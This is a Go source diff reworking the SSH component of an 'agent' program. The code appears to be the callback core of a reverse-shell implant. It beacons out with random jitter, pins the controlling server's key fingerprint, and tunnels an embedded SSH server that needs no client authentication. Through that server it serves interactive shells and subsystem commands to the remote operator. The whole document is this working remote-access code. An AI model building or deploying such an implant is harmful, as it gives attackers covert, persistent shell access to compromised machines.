@@ -1,235 +1,232 @@
 package sshd
 
 import (
+	"agent/internal/config"
+	"agent/internal/logger"
 	"agent/internal/sshd/subsystems"
-	"encoding/binary"
 	"fmt"
 	"io"
-
-	// {{if .Debug}}
-	"log"
-	// {{end}}
+	"math/rand/v2"
 	"net"
+	"time"
 
 	"github.com/google/shlex"
 	"golang.org/x/crypto/ssh"
 )
 
-type ptyReq struct {
-	Term          string
-	Columns, Rows uint32
-	Width, Height uint32
-	Modes         string
+type AgentConfig struct {
+	metadata     string
+	serverConfig *ssh.ServerConfig
+	clientConfig *ssh.ClientConfig
 }
 
-func HandleSSHConnection(conn net.Conn, address string, sshClientConfig *ssh.ClientConfig, sshServerConfig *ssh.ServerConfig) error {
-	sshConn, chans, reqs, err := ssh.NewClientConn(conn, address, sshClientConfig)
+func NewAgentConfig(metadata string) *AgentConfig {
+	lg := logger.GetLogger()
+	signer, err := ssh.ParsePrivateKey(config.GetPrivateKey())
 	if err != nil {
-		return fmt.Errorf("new SSH connection: %w", err)
-	}
-	defer sshConn.Close()
-
-	// {{if .Debug}}
-	log.Printf("Connected to %s", address)
-	// {{end}}
-
-	// Ignore requests
-	go ssh.DiscardRequests(reqs)
-
-	// Handle channels
-	for newChannel := range chans {
-		// {{if .Debug}}
-		log.Printf("New client channel: %s", newChannel.ChannelType())
-		// {{end}}
-		switch newChannel.ChannelType() {
-		case "ssh-jump":
-			channel, request, err := newChannel.Accept()
-			if err != nil {
-				// {{if .Debug}}
-				log.Printf("Failed to accept channel: %v", err)
-				// {{end}}
-				newChannel.Reject(ssh.ConnectionFailed, "Failed to accept channel")
-				continue
-			}
-			go handleJump(channel, request, sshServerConfig)
-		default:
-			// {{if .Debug}}
-			log.Printf("Unknown channel type: %s", newChannel.ChannelType())
-			// {{end}}
-			newChannel.Reject(ssh.ConnectionFailed, "Failed to accept channel")
-		}
+		lg.Fatal("Failed to parse private key: %v", err)
 	}
 
+	agentConfig := &AgentConfig{
+		metadata: metadata,
+	}
+	agentConfig.clientConfig = &ssh.ClientConfig{
+		User:            metadata,
+		Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)},
+		ClientVersion:   config.GetSSHClient(),
+		HostKeyCallback: checkServerKey,
+	}
+	agentConfig.serverConfig = &ssh.ServerConfig{
+		NoClientAuth: true,
+	}
+	agentConfig.serverConfig.AddHostKey(signer)
+
+	return agentConfig
+}
+
+func checkServerKey(hostname string, remote net.Addr, key ssh.PublicKey) error {
+	lg := logger.GetLogger()
+	lg.Info("Checking server key for %s", hostname)
+
+	if ssh.FingerprintSHA256(key) != string(config.GetFingerprint()) {
+		lg.Fatal("Server key mismatch")
+	}
 	return nil
 }
 
-func handleJump(channel ssh.Channel, _ <-chan *ssh.Request, sshServerConfig *ssh.ServerConfig) {
-	// {{if .Debug}}
-	log.Printf("Jump channel accepted")
-	// {{end}}
+func (ac *AgentConfig) Start() error {
+	for {
+		time.Sleep(time.Duration(rand.IntN(10)) * time.Second)
+
+		conn, addr := NewTCPConn()
+		if conn == nil {
+			continue
+		}
+
+		if err := ac.handleSSH(conn, addr); err != nil {
+			lg := logger.GetLogger()
+			lg.Error("Failed to handle SSH connection: %v", err)
+			continue
+		}
+	}
+}
+
+func (ac *AgentConfig) handleSSH(tcpConn net.Conn, addr string) error {
+	conn, chans, reqs, err := ssh.NewClientConn(tcpConn, addr, ac.clientConfig)
+	if err != nil {
+		return fmt.Errorf("failed to create SSH client connection: %v", err)
+	}
+	defer conn.Close()
+
+	lg := logger.GetLogger()
+	lg.Info("Connected to %s", conn.RemoteAddr())
+
+	go ssh.DiscardRequests(reqs)
+	for newChan := range chans {
+		lg.Info("New client channel: %s", newChan.ChannelType())
+		switch newChan.ChannelType() {
+		case "ssh-jump":
+			channel, _, err := newChan.Accept()
+			if err != nil {
+				lg.Error("Failed to accept channel: %v", err)
+				newChan.Reject(ssh.ConnectionFailed, fmt.Sprintf("Failed to accept channel '%s': %v", newChan.ChannelType(), err))
+				continue
+			}
+			go ac.handleJump(channel)
+		default:
+			lg.Warn("Unknown channel type: %s", newChan.ChannelType())
+			newChan.Reject(ssh.UnknownChannelType, fmt.Sprintf("Unknown channel: %s", newChan.ChannelType()))
+		}
+	}
+
+	lg.Warn("Closing SSH connection")
+	return nil
+}
+
+func (ac *AgentConfig) handleJump(channel ssh.Channel) {
+	lg := logger.GetLogger()
+	lg.Info("Jump channel accepted")
 
 	pAgent, pServer := net.Pipe()
-	defer pAgent.Close()
 	defer pServer.Close()
+	defer pAgent.Close()
 
 	go func() {
 		_, err := io.Copy(channel, pServer)
 		if err != nil {
-			// {{if .Debug}}
-			log.Printf("io channel<-pServer error: %v", err)
-			// {{end}}
+			lg.Error("io channel<-pServer error: %v", err)
 		}
 	}()
 	go func() {
 		_, err := io.Copy(pServer, channel)
 		if err != nil {
-			// {{if .Debug}}
-			log.Printf("io pServer<-channel error: %v", err)
-			// {{end}}
+			lg.Error("io pServer<-channel error: %v", err)
 		}
 	}()
 
-	sshConn, chans, reqs, err := ssh.NewServerConn(pAgent, sshServerConfig)
+	conn, chans, reqs, err := ssh.NewServerConn(pAgent, ac.serverConfig)
 	if err != nil {
-		// {{if .Debug}}
-		log.Printf("Failed to create SSH connection: %v", err)
-		// {{end}}
+		lg.Error("Failed to create SSH server connection")
 		return
 	}
-	defer sshConn.Close()
+	defer conn.Close()
 
 	go ssh.DiscardRequests(reqs)
-
-	for newChannel := range chans {
-		// {{if .Debug}}
-		log.Printf("New server channel: %s", newChannel.ChannelType())
-		// {{end}}
-		switch newChannel.ChannelType() {
+	for newChan := range chans {
+		lg.Info("New server channel: %s", newChan.ChannelType())
+		switch newChan.ChannelType() {
 		case "session":
-			channel, request, err := newChannel.Accept()
+			channel, chanReqs, err := newChan.Accept()
 			if err != nil {
-				// {{if .Debug}}
-				log.Printf("Failed to accept channel: %v", err)
-				// {{end}}
-				newChannel.Reject(ssh.ConnectionFailed, "Failed to accept channel")
+				lg.Error("Failed to accept channel: %v", err)
+				newChan.Reject(ssh.ConnectionFailed, fmt.Sprintf("Failed to accept channel '%s': %v", newChan.ChannelType(), err))
 				continue
 			}
-			go handleSession(channel, request)
+			go ac.handleSession(channel, chanReqs)
 		default:
-			// {{if .Debug}}
-			log.Printf("Unknown channel type: %s", newChannel.ChannelType())
-			// {{end}}
-			newChannel.Reject(ssh.ConnectionFailed, "Failed to accept channel")
+			lg.Warn("Unknown channel type: %s", newChan.ChannelType())
+			newChan.Reject(ssh.UnknownChannelType, fmt.Sprintf("Unknown channel: %s", newChan.ChannelType()))
 		}
 	}
 }
 
-func handleSession(channel ssh.Channel, request <-chan *ssh.Request) {
+func (ac *AgentConfig) handleSession(channel ssh.Channel, chanReqs <-chan *ssh.Request) {
 	defer channel.Close()
+	lg := logger.GetLogger()
 
-	var isPty bool
-	var shell = NewShell()
-	for req := range request {
-		// {{if .Debug}}
-		log.Printf("Session request: %s", req.Type)
-		// {{end}}
+	var shell sshShell
+	for req := range chanReqs {
+		lg.Info("New session request: %s", req.Type)
 		switch req.Type {
 		case "pty-req":
-			isPty = true
-			p, err := parsePtyReq(req)
+			var err error
+			shell, err = NewShell()
 			if err != nil {
-				// {{if .Debug}}
-				log.Printf("Failed to parse pty request: %v", err)
-				// {{end}}
+				lg.Error("Failed to create shell: %v", err)
 				req.Reply(false, nil)
 				continue
 			}
-			// {{if .Debug}}
-			log.Printf("PTY request: %s - %dx%d", p.Term, p.Columns, p.Rows)
-			// {{end}}
-			shell.SetSize(int(p.Columns), int(p.Rows))
+
+			err = shell.SetSize(req)
+			if err != nil {
+				lg.Error("Failed to set shell size: %v", err)
+				req.Reply(false, nil)
+				continue
+			}
+
 			req.Reply(true, nil)
 		case "window-change":
-			if len(req.Payload) < 8 {
-				// {{if .Debug}}
-				log.Printf("Window change request received with invalid payload")
-				// {{end}}
-				req.Reply(true, nil)
+			if shell == nil {
+				lg.Error("Shell not initialized")
+				req.Reply(false, nil)
 				continue
 			}
-			columns, rows := parseWindowChangeReq(req.Payload)
-			// {{if .Debug}}
-			log.Printf("Window change request: %dx%d", columns, rows)
-			// {{end}}
-			shell.SetSize(int(columns), int(rows))
+
+			err := shell.SetSize(req)
+			if err != nil {
+				lg.Error("Failed to set shell size: %v", err)
+				req.Reply(false, nil)
+				continue
+			}
+
 			req.Reply(true, nil)
 		case "shell":
-			if isPty {
-				go shell.handleShell(channel)
-				req.Reply(true, nil)
-			} else {
-				// {{if .Debug}}
-				log.Printf("Shell request received before PTY request")
-				// {{end}}
-				channel.Write([]byte("Only PTY requests are supported.\n"))
-				req.Reply(true, nil)
-				return
-			}
-		case "subsystem":
-			// {{if .Debug}}
-			log.Printf("Subsystem request received: %v", req.Payload)
-			// {{end}}
-			line := string(req.Payload[4:])
-
-			args, err := shlex.Split(line)
-			if err != nil && len(args) > 0 {
-				// {{if .Debug}}
-				log.Printf("Failed to parse subsystem command: %v", err)
-				// {{end}}
-				channel.Write([]byte(fmt.Sprintf("Failed to parse subsystem command: %v\n", err)))
-				req.Reply(true, nil)
+			if shell == nil {
+				lg.Error("Shell not initialized")
+				req.Reply(false, nil)
 				continue
 			}
 
-			system := args[0]
-			systemArgs := []string{}
-			if len(args) > 1 {
-				systemArgs = args[1:]
+			go shell.HandleShell(channel)
+			req.Reply(true, nil)
+		case "subsystem":
+			lg.Info("Subsystem request: %s", req.Type)
+
+			line := string(req.Payload[4:])
+			args, err := shlex.Split(line)
+			if err != nil && len(args) > 0 {
+				lg.Error("Failed to parse subsystem command: %v", err)
+				req.Reply(false, nil)
+				continue
 			}
-			if subsystemFunc, ok := subsystems.Subsystems[system]; ok {
-				// {{if .Debug}}
-				log.Printf("Subsystem function found: %s", system)
-				// {{end}}
-				go subsystemFunc(channel, systemArgs)
+
+			subsystem := args[0]
+			subsystemArgs := []string{}
+			if len(args) > 1 {
+				subsystemArgs = args[1:]
+			}
+			if subsystemFunc, ok := subsystems.Subsystems[subsystem]; ok {
+				lg.Info("Subsystem function found: %s", subsystem)
+				go subsystemFunc(channel, subsystemArgs)
 				req.Reply(true, nil)
 			} else {
-				// {{if .Debug}}
-				log.Printf("Subsystem not supported: %s", system)
-				// {{end}}
-				channel.Write([]byte(fmt.Sprintf("Subsystem not supported: %s\n", system)))
-				req.Reply(true, nil)
-				return
+				lg.Error("Subsystem not supported: %s", subsystem)
+				channel.Write([]byte(fmt.Sprintf("Subsystem not supported: %s\n", subsystem)))
+				req.Reply(false, nil)
 			}
 		default:
-			// {{if .Debug}}
-			log.Printf("Unknown request: %v", req.Type)
-			channel.Write([]byte(fmt.Sprintf("Unknown request: %s\n", req.Type)))
-			// {{end}}
-			req.Reply(true, nil)
+			lg.Warn("Unknown request: %s", req.Type)
+			req.Reply(false, nil)
 		}
 	}
-}
-
-func parsePtyReq(req *ssh.Request) (*ptyReq, error) {
-	var data ptyReq
-	if err := ssh.Unmarshal(req.Payload, &data); err != nil {
-		return nil, err
-	}
-	return &data, nil
-}
-
-func parseWindowChangeReq(req []byte) (uint32, uint32) {
-	columns := binary.BigEndian.Uint32(req)
-	rows := binary.BigEndian.Uint32(req[4:])
-	return columns, rows
 }
